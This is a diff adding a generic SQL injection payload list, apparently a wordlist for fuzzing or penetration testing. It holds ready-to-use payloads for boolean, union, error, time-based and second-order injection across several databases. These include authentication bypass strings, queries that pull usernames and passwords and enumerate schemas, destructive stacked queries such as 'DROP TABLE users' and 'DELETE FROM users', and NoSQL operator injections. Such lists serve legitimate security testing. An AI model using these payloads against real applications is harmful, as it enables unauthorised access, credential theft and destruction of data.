@@ -1,0 +1,155 @@
+# SQL Injection Payloads - Generic
+# Source: Compiled from various security research resources
+
+# Boolean-based - Basic
+' OR '1'='1
+" OR "1"="1
+' OR '1'='1'--
+" OR "1"="1"--
+' OR '1'='1'#
+" OR "1"="1"#
+' OR '1'='1'/*
+" OR "1"="1"/*
+
+# Boolean-based - Numeric
+1 OR 1=1
+1 AND 1=1
+1 OR 1=1--
+1 AND 1=1--
+1 OR 1=1#
+1 AND 1=1#
+
+# Boolean-based - False conditions
+' AND '1'='2
+" AND "1"="2
+' AND '1'='2'--
+" AND "1"="2"--
+1 AND 1=2
+1 AND 1=2--
+
+# Stacked queries
+'; DROP TABLE users--
+' ; DROP TABLE users--
+"; DROP TABLE users--
+'; DROP DATABASE--
+'; DELETE FROM users--
+
+# Union-based
+' UNION SELECT NULL--
+" UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT user,password FROM users--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT 1,version(),3,4--
+' UNION SELECT 1,database(),3,4--
+' UNION SELECT 1,user(),3,4--
+' UNION SELECT NULL,version()--
+' UNION SELECT NULL,database()--
+' UNION SELECT NULL,user()--
+' UNION SELECT NULL,table_name FROM information_schema.tables--
+' UNION SELECT NULL,column_name FROM information_schema.columns--
+'UNION SELECT NULL--
+"UNION SELECT NULL--
+`UNION SELECT NULL--
+) UNION SELECT NULL--
+) UNION SELECT NULL,NULL--
+
+# Error-based - SQL syntax errors
+'
+"
+')
+(")
+`)
+'))
+(("))
+'))
+;
+%27
+%22
+%29
+%28
+
+# Time-based (MySQL)
+' AND SLEEP(5)--
+" AND SLEEP(5)--
+' AND SLEEP(1)--
+' AND SLEEP(3)--
+' AND BENCHMARK(5000000,MD5(1))--
+' WAITFOR DELAY '00:00:05'--
+;EXEC xp_dirtree 'C:\'--
+
+# Time-based (PostgreSQL)
+' AND pg_sleep(5)--
+' AND pg_sleep(3)--
+' ; SELECT pg_sleep(5)--
+
+# Time-based (SQL Server)
+' WAITFOR DELAY '00:00:05'--
+" WAITFOR DELAY '00:00:05'--
+' WAITFOR DELAY '0:0:5'--
+
+# Time-based (Oracle)
+' AND DBMS_PIPE.RECEIVE_MESSAGE('X',5)--
+' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('X',5)--
+
+# Comment sequences
+--
+#
+--
+#
+/*
+--*/
+--
+;--
+%;--
+#;%00
+
+# Order by enumeration
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 4--
+' ORDER BY 5--
+' ORDER BY 6--
+' ORDER BY 7--
+' ORDER BY 8--
+' ORDER BY 9--
+' ORDER BY 10--
+' ORDER BY 100--
+' ORDER BY 999--
+
+# Hex encoding
+0x274F52202731273D2731
+0x73716C696E6A656374696F6E
+
+# Authentication bypass
+' OR 1=1--
+admin'--
+admin'#
+' or 1=1--
+" or 1=1--
+' or 1=1#
+' or 1=1/*
+) or '1'='1--
+) or ('1'='1--
+' union select NULL--
+' union select NULL,NULL--
+' union select NULL,NULL,NULL--
+
+# Second-order SQLi
+'||(SELECT '')||
+'||(SELECT password FROM users WHERE username='admin')||
+';SELECT SLEEP(5)--
+
+# NoSQL / MongoDB injection
+' || '1'=='1
+' && '1'=='1
+' || 1==1
+' && 1==1
+{"$ne": null}
+{"$ne": ""}
+{"$gt": ""}
+{"$where": "this.password == '123'"}
